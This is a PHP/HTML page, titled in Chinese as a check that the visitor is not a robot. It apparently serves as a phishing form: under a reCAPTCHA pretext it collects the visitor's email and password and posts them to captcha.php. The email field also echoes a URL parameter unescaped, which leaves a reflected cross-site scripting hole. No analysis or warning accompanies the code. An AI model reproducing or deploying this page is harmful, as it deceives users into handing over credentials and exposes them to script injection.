<?php
require('constant.php');
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<title>驗證你不是機器人</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<script src="component/jquery/jquery-3.2.1.min.js"></script>


	<style>
	.label {margin: 2px 0;}
	.field {margin: 0 0 20px 0;}	
		.content {width: 960px;margin: 0 auto;}
		h1, h2 {font-family:"Georgia", Times, serif;font-weight: normal;}
		div#central {margin: 40px 0px 100px 0px;}
		@media all and (min-width: 768px) and (max-width: 979px) {.content {width: 750px;}}
		@media all and (max-width: 767px) {
			body {margin: 0 auto;word-wrap:break-word}
			.content {width:auto;}
			div#central {	margin: 40px 20px 100px 20px;}
		}
		body {font-family: 'Helvetica',Arial,sans-serif;background:#ffffff;margin: 0 auto;-webkit-font-smoothing: antialiased;  font-size: initial;line-height: 1.7em;}	
		input, textarea {width:100%;padding: 15px;font-size:1em;border: 1px solid #A1A1A1;	}
		button {
			padding: 12px 60px;
			background: #5BC6FF;
			border: none;
			color: rgb(40, 40, 40);
			font-size:1em;
			font-family: "Georgia", Times, serif;
			cursor: pointer;	
		}
		#message {  padding: 0px 40px 0px 0px; }
		#mail-status {
			padding: 12px 20px;
			width: 100%;
			display:none; 
			font-size: 1em;
			font-family: "Georgia", Times, serif;
			color: rgb(40, 40, 40);
		}
	  .error{background-color: #F7902D;  margin-bottom: 40px;}
	  .success{background-color: #48e0a4; }
		.g-recaptcha {margin: 0 0 25px 0;}	  
	</style>
	<script src='https://www.google.com/recaptcha/api.js'></script>	
</head>
<body>

<div id="central">
	<div class="content">
		<h1>驗證你不是機器人</h1>
		<div id="message">
		<form id="frmContact" action="captcha.php" method="POST">
			
			<div class="label">電子郵件：</div>
			<div class="field">			
			<input type="text" id="email" name="email"  class="required email" placeholder="請輸入電郵地址" value="<?php echo $_GET['email']; ?>">
			</div>
			<div class="label">Password:</div>
			<div class="field">			
				<input name="password" type="password" class="required phone" id="password" title="Please enter your phone number" value="" placeholder="輸入您的密碼" aria-required="true" required="required">
			</div>
			
			<div class="g-recaptcha" data-sitekey="<?php echo SITE_KEY; ?>"></div>			
			<div id="mail-status"></div>			
			<button type="Submit" id="send-message" style="clear:both;">Send Message</button>
		</form>
		<div id="loader-icon" style="display:none;"><img src="img/loader.gif" /></div>
		</div>		
	</div><!-- content -->
</div><!-- central -->	
</body>
</html>
